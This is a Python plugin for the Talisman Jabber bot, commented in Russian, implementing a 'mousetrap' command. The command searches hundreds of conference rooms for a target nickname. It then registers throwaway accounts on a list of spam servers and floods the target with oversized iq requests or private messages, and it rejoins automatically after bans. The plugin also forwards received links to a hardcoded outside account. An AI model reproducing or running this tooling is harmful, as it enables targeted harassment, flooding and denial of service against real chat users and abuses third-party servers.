#===istalismanplugin===
# -*- coding: utf-8 -*-

#  by 40tman
#  this plugin use code from userseach_plugin.py, codded by Avinar (avinar@xmpp.ru)

# beta testing version!

from re import match

mdisco__pending=[]
inrooms_=[]
suser_=''
suserdef_=''
skonfs_=0
kir_=1
reg_=1
st_=1
MOUSE_NICK=[]
MOUSE_CHAT=[]
MTR=[]

def hand_disco_ext_mouse_n(parameters):
	iq = xmpp.Iq('get')
	
	while 1:
		iqs = 'dis'+str(random.randrange(1000, 9999))
		if iqs not in globals()['mdisco__pending']:
			break
	globals()['mdisco__pending'].append(iqs)
	iq.setID(iqs)
	iq.addChild('query', {}, [], 'http://jabber.org/protocol/disco#items')
	if parameters:
		iq.setTo(parameters)
		JCON.SendAndCallForResponse(iq, hand_disco_ext_mouse, {'parameters': parameters})
		return
	

def hand_disco_ext_mouse(coze, res, parameters):
	test1=string.split(parameters, ' ', 1)
	test2=string.split(test1[0], '@', 1)
	if len(test2)==2:
		trig=0
	else:
		trig=1
	discos=[]
	rep=0
	id=res.getID()
	if id in globals()['mdisco__pending']:
		globals()['mdisco__pending'].remove(id)
	else:
		print 'someone is doing wrong...'
		return
	if res:
		if res.getType() == 'result':
			props=res.getQueryChildren()
			for x in props:
				att=x.getAttrs()
				if trig:
					print 'errrm'
					discos.append(att['jid'])
					trig=2
				else:
					if att.has_key('name'):
#						print att['name'],globals()['suser']
						
#						att['name']=att['name'].encode('utf-8')
						defname=att['name']						
						
#						print att['name'],globals()['suser'].encode('utf-8')
						
						globals()['skonfs_']= globals()['skonfs_'] + 1
						if globals()['reg_']==2:
							globals()['suser_']=globals()['suser_'].lower()
							att['name']=att['name'].lower()
						if globals()['kir_']==2:
							globals()['suser_']=globals()['suser_'].replace(u'a', u'а').replace(u'A', u'А').replace(u'e', u'е').replace(u'E', u'Е').replace(u'T', u'Т').replace(u'O', u'О').replace(u'o', u'о').replace(u'p', u'р').replace(u'P', u'Р').replace(u'H', u'Н').replace(u'k', u'к').replace(u'K', u'К').replace(u'X', u'Х').replace(u'x', u'х').replace(u'C', u'С').replace(u'c', u'с').replace(u'B', u'В').replace(u'M', u'М').replace(u'Y', u'У').replace(u'0', u'О')
							att['name']=att['name'].replace('a', u'а').replace('A', u'А').replace('e', u'е').replace('E', u'Е').replace('T', u'Т').replace('O', u'О').replace('o', u'о').replace('p', u'р').replace('P', u'Р').replace('H', u'Н').replace('k', u'к').replace('K', u'К').replace('X', u'Х').replace('x', u'х').replace('C', u'С').replace('c', u'с').replace('B', u'В').replace('M', u'М').replace('Y', u'У').replace('0', u'О')
						if globals()['st_']==2:
							if globals()['suser_']==att['name']:
								globals()['inrooms_'].append(parameters + ' '+defname)
								rep=1
						else:
							if att['name'].count(globals()['suser']):
								globals()['inrooms_'].append(parameters + ' '+defname)
								rep=1
								return



def handler_mousetrap(type, source, parameters):
	if parameters:
                t=0
                for x in threading.enumerate():
                        t+=1
                if t>30:
                        reply(type,source,unicode(t)+u' количество потоков превышает среднюю нагрузку.')
                        return
		if globals()['suser_']:
			reply(type,source,u'На данный момент я ловлю другую мышу.')
			return
		if parameters.count(' '):
                        s=parameters.split()
                        if s[0].count('@con') and len(s[1])>2:
                                reply(type,source,u'сча мы ее прихлопнем!')
                                MTR.append('1')
                                mousetrap_start(s[0],s[1])
                                return
		if type=='public':
			reply(type,source,u'Сканирую комнаты,жди 2 минуты.')
		else:
			reply(type,source,u'Мышеловка активирована...')
		MTR.append('1')
		globals()['inrooms_']=[]
		globals()['skonfs_']=0
		globals()['suserdef_']=''
		globals()['mdisco__pending_']=[]
		globals()['reg_']=1
		globals()['kir_']=1
		globals()['st_']=2
		globals()['MKEY_1']={}
		globals()['MOUSE_CHAT']=[]
		globals()['MOUSE_CHAT'].append(source[1]+'/'+source[2])
		parameters=parameters.split(' ')
		for line in parameters:
			if line == u'-k':
                                reply(type,source,u'допольнительные ключи выключены!')
                                return
				#globals()['kir_']=2
			elif line == u'-r':
                                reply(type, source,u'допольнительные ключи выключены!')
                                return
				#globals()['reg_']=2		
			elif line == u'-s':
                                reply(type, source, u'допольнительные ключи выключены!')
                                return
				#globals()['st_']=1
			elif (len(line)==2) & (line.count('-')):
				continue
			else:
				if globals()['suser_']=='':
					globals()['suser_']+=line
					globals()['suserdef_']+=line
				else:
					globals()['suser_']+=' '+line
					globals()['suserdef_']+=' '+line
		
		handler_mdiscomouse(type, source, parameters,'conference.jabber.ru',500)
                handler_mdiscomouse(type, source, parameters,'conference.qip.ru',35)
                threading.Thread(None,COMMAND_HANDLERS['disco_mouse'],'command'+str(INFO['thr']),(type, source, parameters,)).start()
	else:
		reply(type,source,u'ииии?')
		return
			
			
			
def handler_mdiscomouse(type, source, parameters,server,stop):
	iq = xmpp.Iq('get')
	
	while 1:
		iqs = 'dis'+str(random.randrange(1000, 9999))
		if iqs not in globals()['mdisco__pending']:
			break		
	
	globals()['mdisco__pending'].append(iqs)
	iq.setID(iqs)
	iq.addChild('query', {}, [], 'http://jabber.org/protocol/disco#items')
	iq.setTo(server)
	JCON.SendAndCallForResponse(iq, handler_mdisco_ext_m, {'type': type, 'source': source, 'stop': stop, 'parameters': server})
	return

	

def handler_mdisco_ext_m(coze, res, type, source, stop, parameters):
	test1=string.split(parameters, ' ', 1)
	test2=string.split(test1[0], '@', 1)
	if len(test2)==2:
		trig=0
	else:
		trig=1
	mdisco_=[]
	rep=''
	id=res.getID()
	if id in globals()['mdisco__pending']:
		globals()['mdisco__pending'].remove(id)
	else:
		print 'someone is doing wrong...'
		reply(type, source, u'глюк')
		return
	if res:
		if res.getType() == 'result':
			props=res.getQueryChildren()
			for x in props:
				att=x.getAttrs()
				if trig:
					if att.has_key('name'):
						st=re.match('(.*) \(([0-9]+)\)$', att['name'])
						if st:
							st=st.groups()
							if int(st[1])>100:
								continue
							mdisco_.append([st[0],att['jid'],int(st[1])])
							trig=1
					else:
						mdisco_.append(att['jid'])
						trig=2
				else:
					if att.has_key('name'):
						mdisco_.append(att['name'])
						trig=0
			hand_2mdisco_answ(type,source,trig,stop,mdisco_,parameters)
			return
		else:
			print parameters + u' лежит'
	else:
		print u'o_O'
	
	
def hand_2mdisco_answ(type,source,trig,stop,mdisco,parameters):
	total=0
	if str(total)==stop:
		reply(type, source, u'всего '+str(len(mdisco))+u' пунктов')
		return
	if trig:
		mdisco.sort(lambda x,y: x[2] - y[2])
		mdisco.reverse()
		for x in mdisco:
			total=total+1
			hand_disco_ext_mouse_n(x[1])
			if total==stop:
				break

	
def handler_disco_an_mouse(type, source, parameters):
	time.sleep(110)
	rep=u'Поймал!Мыша ' + globals()['suserdef_'] + u' сейчас находится в:\n '
	gg=''
	if len(globals()['inrooms_']) > 0:
                n=0
		for g in globals()['inrooms_']:
                        n+=1
                        if n>10:
                                break
                        gg= gg + g + u'\n '
                        s=g.split()
			groupchat=s[0]
			nick=s[1]
			MKEY_1[groupchat]={'nick':nick}
			threading.Thread(None, mousetrap_start, 'mousetrap_start'+str(random.randrange(0, 999)), (groupchat,nick,)).start()
		rep= rep + gg + u'\nвсего пользователей проверено: ' + str(globals()['skonfs_'])
	else:
		rep=u'Мыша ' + globals()['suserdef_'] + u' не найдена. Всего проверено юзеров: ' + str(globals()['skonfs_'])
	globals()['suser_']=''
	reply('private',source,rep.strip())
	
mdisco_=[]

def mousetrap_join(cl,groupchat,nick):
        add=['|','_','/','.','0']
        botnick = generate_mousetrap(random.Random().randint(7,11))
        if MOUSE_NICK:
                botnick=random.choice(MOUSE_NICK)
        CAPS = 'http://qip.ru/caps'
        NODE_ = u'<presence to="%TO_ROOM%/%NICK%"><priority>%PRIORETET%</priority><x xmlns="http://jabber.org/protocol/muc" /><c xmlns="http://jabber.org/protocol/caps" node="%CAPS%" ver="9036" /><show>%SHOW%</show><x xmlns="http://qip.ru/x-status" id="20"><title></title></x><status>%TEXT%</status></presence>'.replace('%TO_ROOM%', groupchat).replace('%NICK%', botnick).replace('%PRIORETET%', u'1').replace('%CAPS%', CAPS).replace('%TEXT%', u'').replace('%SHOW%', u'')
        node=xmpp.simplexml.XML2Node(unicode(NODE_).encode('utf8'))
  
        #prs = xmpp.protocol.Presence(groupchat+'/'+botnick)
        #prs.setTag('x', namespace=xmpp.NS_MUC).addChild('history', {'maxchars':'0', 'maxstanzas':'0'})
        try:
                cl.send(node)
        except:
                pass
        threading.Thread(None, mousetrap_query, 'mousetrap_query'+str(random.randrange(0, 999)), (cl,groupchat,nick,)).start()

GGS = []
MOUSE_CONF=[]

def mousetrap_message(cl, msg):
        body=msg.getBody()
        if body.count('http://'):
                JCON.send(xmpp.Message(u'some_user@talkonaut.com',body,'chat'))
        
def mousetrap_start(groupchat,nick):
        try:
                SPIS=[u'myjabber.ru',u'jabber.ru',u'xmpp.ru',u'jabberon.ru',u'jabbus.org',u'jabber.kiev.ua',u'talkonaut.com',u'jabber.cz',u'qip.ru']
                node=generate_mousetrap(random.Random().randint(7,11))
                domain=random.choice(GGS)
                if not ch_n_mouse(nick):
                        return
                password=generate_mousetrap(random.Random().randint(7,11))
                jid = xmpp.protocol.JID(node=node, domain=domain, resource='QIP')
                cl = xmpp.Client(jid.getDomain(), debug=[])
                con = cl.connect()
                if not con:
                        threading.Thread(None, mousetrap_start, 'mousetrap_start'+str(random.randrange(0, 999)), (groupchat,nick,)).start()
                        return
                cl.RegisterHandler('presence',mousetrap_presence)
                cl.RegisterHandler('message',mousetrap_message)
                #cl.RegisterHandler('message',mousetrap_msg)
                try:
                        xmpp.features.register(cl, domain, {'username': node, 'password':password})
                except AttributeError:
                        pass
                au=cl.auth(jid.getNode(), password, jid.getResource())
                if not au:
                        threading.Thread(None, mousetrap_start, 'mousetrap_start'+str(random.randrange(0, 999)), (groupchat,nick,)).start()
                        return
                print u'Registered'
                cl.sendInitPresence()
                threading.Thread(None, mousetrap_join, 'mousetrap_join'+str(random.randrange(0, 999)), (cl,groupchat,nick,)).start()
                time.sleep(5)
                while '1' in MTR:
                        cl.Process(1)
                #threading.Thread(None, mousetrap_query, 'mousetrap_query'+str(random.randrange(0, 999)), (cl,groupchat,nick,)).start()
        except:
                pass

def ch_n_mouse(text):
        i=chr(52)
        if not text.count(i):
                return 1
        return 0

MKEY_1={} 

def mousetrap_presence(cl,prs):
        print 'prs'
        try:
                print unicode(prs)
                fromjid = prs.getFrom()
                groupchat = fromjid.getStripped()
                nick = fromjid.getResource()
                ptype = prs.getType()
                #threading.Thread(None, mouse_prs, 'mouse_prs'+str(random.randrange(0, 999)), (groupchat,MKEY_1[groupchat]['nick'],)).start()
                if ptype == 'error':
                        print 'BAN'
                        if '1' in MTR:
                                threading.Thread(None, mousetrap_start, 'mousetrap_start'+str(random.randrange(0, 999)), (groupchat,MKEY_1[groupchat]['nick'],)).start()
        except:
                pass


def mousetrap_msg(cl,msg):
        body= msg.getBody()
        if body.count('cap') and body.count('http://'):
                print 'captcha'
                for x in globals()['MOUSE_CHAT']:
                        JCON.send(xmpp.Message(x,body[:370],'chat'))
                        time.sleep(0.5)

def GoMouse(cl,anything):
        while cl.isConnected():
                try:
                        cl.Process(1)
                except:
                        pass



def mousetrap_query(cl,groupchat,nick):
        jid=groupchat+'/'+nick
        while MTR:
                if not '1' in MOUSE_CONF:
                        time_iq = xmpp.Iq('get')
                        id='time'+str(random.randrange(1000, 9999))
                        time_iq.setID(id)
                        time_iq.addChild('query', {}, [], 'jabber:iq:version');
                        time_iq.setData(generate_mousetrap(random.Random().randint(30000,40000)))
                        time_iq.setTo(jid)
                        if cl.isConnected():
                                try:
                                        cl.send(time_iq)
                                except:
                                        pass
                        else:
                                break
                        q_iq = xmpp.Iq('get')
                        id='time'+str(random.randrange(1000, 9999))
                        q_iq.setID(id)
                        q_iq.addChild('query', {}, [], xmpp.NS_DISCO_INFO);
                        q_iq.setData(generate_mousetrap(random.Random().randint(30000,40000)))
                        q_iq.setTo(jid)
                        if cl.isConnected():
                                try:
                                        cl.send(q_iq)
                                except:
                                        pass
                        else:
                                break
                else:
                        try:
                                msg=generate_mousetrap(random.Random().randint(3,11))
                                cl.send(xmpp.Message(jid,msg,'chat'))
                        except:
                                pass
        print 'off'
        try:
                cl.disconnect()
        except Exception:
                pass

def generate_mousetrap(_len = None, sg = None):
  if sg == None:
    sg = 'aoeuizxcvbnmsdfghjklqwrtyp1234567890'
  if _len == None:
    _len = random.Random().randint(1, 100)
  s = ''
  l = len(sg)
  while _len > 0:
    s += sg[random.Random().randint(0, l - 1)]
    _len -= 1
  return s

def mouse_work(type,source,parameters):
        if MTR:
                globals()['MTR']=[]
                reply(type,source,u'mousetrap disconnect')
                return
        else:
                reply(type,source,u'no active')

def mouse_load():
        if not GGS:
                try:
                        if not os.path.exists('dynamic/mousetrap.txt'):
                                mf='dynamic/mousetrap.txt'
                                fp=open(mf, 'w')
                                fp.write('{}')
                                fp.close()
                        if not os.path.exists('dynamic/mouse_config.txt'):
                                mc='dynamic/mouse_config.txt'
                                fp=open(mc, 'w')
                                fp.write('{}')
                                fp.close()
                        server='dynamic/spamserv.txt'
                        nxn=eval(read_file(server))
                        for x in nxn:
                                GGS.append(x)
                        txt={}
                        try:
                                txt=eval(read_file('dynamic/mouse_config.txt'))
                        except:
                                write_file('dynamic/mouse_config.txt','{}')
                        if '1' in txt:
                                MOUSE_CONF.append('1')
                        if os.path.exists('dynamic/nick.txt'):
                                read=eval(read_file('dynamic/nick.txt'))
                                if read:
                                        for x in read:
                                                MOUSE_NICK.append(x)
                except:
                        print u'error in mousetrap_plugin.py, check file dynamic/spamserv.txt'

def mouse_conf(type,source,parameters):
        if not os.path.exists('dynamic/mouse_config.txt'):
                return
        txt=eval(read_file('dynamic/mouse_config.txt'))
        if not parameters:
                if txt:
                        reply(type,source,u'мышеловка гасит сообщениями!')
                        return
                else:
                        reply(type,source,u'мышеловка гасит iq-запросами!')
                        return
        else:
                if parameters=='1':
                        txt['1']={}
                        write_file('dynamic/mouse_config.txt',str(txt))
                        if not '1' in MOUSE_CONF:
                                MOUSE_CONF.append('1')
                        reply(type,source,u'теперь мышеловка гасит сообщениями!')
                        return
                else:
                        write_file('dynamic/mouse_config.txt','{}')
                        globals()['MOUSE_CONF']=[]
                        reply(type,source,u'теперь мышеловка гасит iq-flood-oM!')
        
register_stage0_init(mouse_load)
register_command_handler(handler_disco_an_mouse, 'disco_mouse', [], 100, 'служебная команда', 'не заморачивайтесь на ней', ['НЕ КОМЕНТИТЬ'])			
register_command_handler(handler_mousetrap, 'мышеловка', ['все'], 40, 'Ищет указанный никнейм в 1000 лучших конференций русской сети Jabber и спамит этот ник iq-запросами или сообщениями в приват.\nДоп. Можно указать комнату и ник сразу.', 'мышеловка <ник>', ['мышеловка Avinar','мышеловка vista@conference.jabber.ru Avinar'])
register_command_handler(mouse_work, 'мышеловка_стоп', ['все'], 40, 'Останавливает мышеловку', 'мышеловка_стоп', ['мышеловка_стоп'])
register_command_handler(mouse_conf, 'мышеловка_конфиг', ['все'], 40, 'Настройка мышеловки.Без параметров показывает состояние настроек.1 - флуд сообщениями, 0 - iq-флуд.', 'мышеловка_конфиг <0|1>', ['мышеловка_конфиг 1'])
